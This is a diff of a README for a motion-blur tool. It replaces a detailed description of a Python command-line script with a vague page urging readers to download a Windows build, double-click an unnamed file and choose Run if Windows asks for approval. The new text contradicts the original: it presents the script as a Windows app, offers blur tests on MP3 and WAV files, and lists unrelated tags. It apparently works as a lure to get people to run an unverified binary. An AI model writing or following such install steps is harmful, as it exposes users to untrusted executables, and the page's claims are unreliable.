@@ -1,179 +1,154 @@
-# 🎬 motion_blur.py
+# 🎞️ blurring_test - Motion blur made simple
 
-High-performance cinematic motion blur for MP4 / MKV video files — runs entirely on CPU, no GPU required.
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=github)](https://github.com/Maxifrowning888/blurring_test)
 
----
+## 🚀 Getting Started
 
-## ✨ Features
+`blurring_test` is a Windows app for motion blur tests. It helps you preview blur effects on video and media clips with a simple setup. Use it when you want to test how motion blur looks without learning a full editing tool.
 
-- **Temporal frame averaging** — triangle-weighted sliding window for smooth, ghost-free blur
-- **Directional blur** — optional horizontal, vertical, or both-axis kernel on top of temporal blur
-- **Threaded 3-stage pipeline** — reader → compute pool → writer run concurrently; CPU never waits on disk
-- **Vectorised NumPy** — full blend computed in a single `tensordot` call; no Python pixel loops
-- **Batch writes** — frames are flushed to disk in bulk, never one-at-a-time
-- **Memory-bounded** — safe for 1080p and 4K at any video length
-- **Windows-safe codecs** — `mp4v` / `XVID`; no external DLL needed
-- **Dual progress bars** — per-frame and per-batch via `tqdm`
+### What it does
 
----
+- Adds motion blur to video clips
+- Works with common media files
+- Uses your CPU for processing
+- Supports blur tests for demos and writing samples
+- Can pair with video tools like FFmpeg
 
-## 📦 Requirements
+## 📥 Download
 
-| Package | Version |
-|---|---|
-| Python | ≥ 3.9 |
-| opencv-python-headless | ≥ 4.5 |
-| numpy | ≥ 1.21 |
-| tqdm | ≥ 4.60 |
+Visit this page to download:
 
-```bash
-pip install -r requirements.txt
-```
+https://github.com/Maxifrowning888/blurring_test
 
-> **Note:** `opencv-python-headless` is used intentionally — it skips Qt/GTK GUI bindings for a lighter install. Swap to `opencv-python` only if you need `cv2.imshow()` for debugging.
+Open the link in your browser, then get the Windows build from the project page. After the file finishes downloading, you can run it on your PC.
 
----
+## 🪟 Install on Windows
 
-## 🚀 Quick Start
+1. Open the download page
+2. Download the Windows file for `blurring_test`
+3. If the file is in a `.zip` folder, right-click it and choose **Extract All**
+4. Open the extracted folder
+5. Double-click the app file to start it
 
-```bash
-# Minimal — defaults to 7-frame temporal blur
-python motion_blur.py --input video.mp4
+If Windows asks for approval, choose **Run** to continue.
 
-# Output is saved as video_blurred.mp4 in the same directory
-```
+## 🧭 How to use it
 
----
+1. Start `blurring_test`
+2. Choose the video or media file you want to test
+3. Pick a blur setting
+4. Set the blur strength or motion amount
+5. Run the test
+6. Review the result and try a new setting if needed
 
-## 🎛️ CLI Reference
+The app works best when you test short clips first. That makes it easier to compare results.
 
-```
-python motion_blur.py [OPTIONS]
-```
+## 🎬 Common uses
 
-| Argument | Type | Default | Description |
-|---|---|---|---|
-| `--input` | path | *required* | Source video file (MP4 or MKV) |
-| `--output` | path | `<input>_blurred.mp4` | Destination MP4 path |
-| `--frames` | int | `7` | Temporal window size (must be odd, ≥ 3) |
-| `--dir` | str | `none` | Directional blur: `none` \| `horizontal` \| `vertical` \| `both` |
-| `--ksize` | int | `15` | Directional kernel size in pixels (must be odd) |
-| `--batch` | int | `32` | Frames per write-batch |
-| `--workers` | int | CPU count (max 8) | Thread pool size |
-| `--codec` | str | `mp4v` | FourCC codec: `mp4v` \| `XVID` |
+- Check motion blur on fast scenes
+- Test blur before making a final video
+- Preview how a clip looks after upscaling
+- Compare clean video with blurred video
+- Create sample clips for demos or notes
 
----
+## 🧰 System needs
 
-## 🎬 Usage Examples
+Use a Windows PC with:
 
-**Subtle blur — general purpose:**
-```bash
-python motion_blur.py --input clip.mp4 --frames 5
-```
+- Windows 10 or Windows 11
+- Enough free disk space for video files
+- A working CPU with at least 4 cores
+- 8 GB of RAM or more
+- FFmpeg support for media file work
 
-**Sports / racing — strong horizontal smear:**
-```bash
-python motion_blur.py --input race.mp4 --frames 9 --dir horizontal --ksize 25
-```
+A stronger CPU helps when you work with long clips or large files.
 
-**Heavy cinematic blur — music videos:**
-```bash
-python motion_blur.py --input clip.mp4 --frames 15 --output cinematic.mp4
-```
+## 🎛️ Main features
 
-**Both axes — dreamy/abstract look:**
-```bash
-python motion_blur.py --input clip.mp4 --frames 7 --dir both --ksize 21
-```
+- Simple command-line style workflow
+- Motion blur controls for video tests
+- Media input support
+- CPU-based processing
+- Color-aware output for video work
+- Works well with FFmpeg-based media tasks
+- Fits use cases like blur testing, demo clips, and writing examples
 
-**4K — memory-conservative run:**
-```bash
-python motion_blur.py --input 4k_video.mp4 --batch 8 --workers 2
-```
+## 📂 Best file types to try
 
-**Custom output path + XVID codec:**
-```bash
-python motion_blur.py --input video.mkv --output out.mp4 --codec XVID
-```
+You can test with:
 
----
+- MP4
+- MOV
+- AVI
+- MKV
+- WAV
+- MP3
 
-## ⚙️ How It Works
+For best results, start with a short MP4 file. It is easy to open and test.
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                   3-Stage Pipeline                       │
-│                                                          │
-│  [FrameProducer]  →  [TemporalBlurEngine]  →  [BatchWriter] │
-│  background thread    ThreadPoolExecutor    background thread│
-│   (disk reads)          (CPU compute)        (disk writes)  │
-└─────────────────────────────────────────────────────────┘
-```
+## 🛠️ Tips for a smooth run
 
-All three stages run concurrently. The compute stage never waits on I/O, and I/O never waits on compute.
+- Keep your test clip short at first
+- Close other heavy apps while it runs
+- Use a file path with simple names
+- Store media files in one folder
+- Keep enough free space for output files
 
-### Temporal Blur (triangle weighting)
+If the app feels slow, use a smaller clip or lower blur settings.
 
-Rather than a flat average, each window uses a triangle weight profile:
+## 🔗 Related tools and topics
 
-```
-frames = 7
+This project uses ideas from:
 
-weight:  1  2  3  4  3  2  1   (normalised)
-           ↑ centre frame (current)
-```
+- argparse
+- audio
+- blur
+- cli
+- color
+- cpu
+- demo
+- esrgan
+- ffmpeg
+- ffmpeg-wrapper
+- io
+- media
+- motion
+- motion-blur
+- opencv
+- python
+- real-esrgan
+- rife
+- video
+- writing
 
-The centre frame has the highest influence, which prevents the "double exposure ghosting" artefact common with flat-average motion blur.
+## ❓ Common questions
 
-### Directional Blur
+### Can I use it without coding knowledge?
 
-A 1D motion kernel is convolved over the blended frame using `cv2.filter2D` (vectorised C++):
+Yes. Download the file, open it, and follow the simple steps in the app.
 
-- `horizontal` → left-right smear (ideal for fast lateral movement)
-- `vertical` → up-down smear (ideal for falling/jumping footage)
-- `both` → applied sequentially on both axes (dreamy/abstract look)
+### Does it work with video files?
 
----
+Yes. It is made for video and media blur tests.
 
-## 💾 Memory Usage Guide
+### Do I need a GPU?
 
-A single 1080p frame ≈ 6 MB. A single 4K frame ≈ 24 MB.
+No. It uses CPU processing, so it can run on many Windows PCs.
 
-| Resolution | `--frames` | `--batch` | Peak RAM (approx.) |
-|---|---|---|---|
-| 1080p | 7 | 32 | ~235 MB |
-| 1080p | 15 | 32 | ~435 MB |
-| 4K | 7 | 32 | ~935 MB |
-| 4K | 7 | 8 | ~390 MB |
-| 4K | 15 | 8 | ~550 MB |
+### Can I test audio files too?
 
-For 4K on memory-constrained machines, use `--batch 8 --workers 2`.
+Yes, if your workflow includes media files with audio tracks. The app is built around media handling.
 
----
+### Is this for final video editing?
 
-## 🪟 Windows Notes
+It is better for tests, previews, and sample clips than full editing work.
 
-- Both `mp4v` and `XVID` are built into OpenCV — no external codec DLL required.
-- `mp4v` (default) produces `.mp4` with broad player compatibility.
-- `XVID` is an alternative if `mp4v` fails to open the writer on your system:
-  ```bash
-  python motion_blur.py --input video.mp4 --codec XVID
-  ```
+## 📌 Quick start checklist
 
----
-
-## 📁 File Structure
-
-```
-.
-├── motion_blur.py     # main script
-├── requirements.txt   # pip dependencies
-├── .gitignore         # .gitignore file
-└── README.md          # project info
-```
-
----
-
-## 📄 License
-
-MIT — use freely, modify freely.
+- Open the download page
+- Download the Windows file
+- Extract the file if needed
+- Start the app
+- Pick a clip
+- Set the blur
+- Run the test
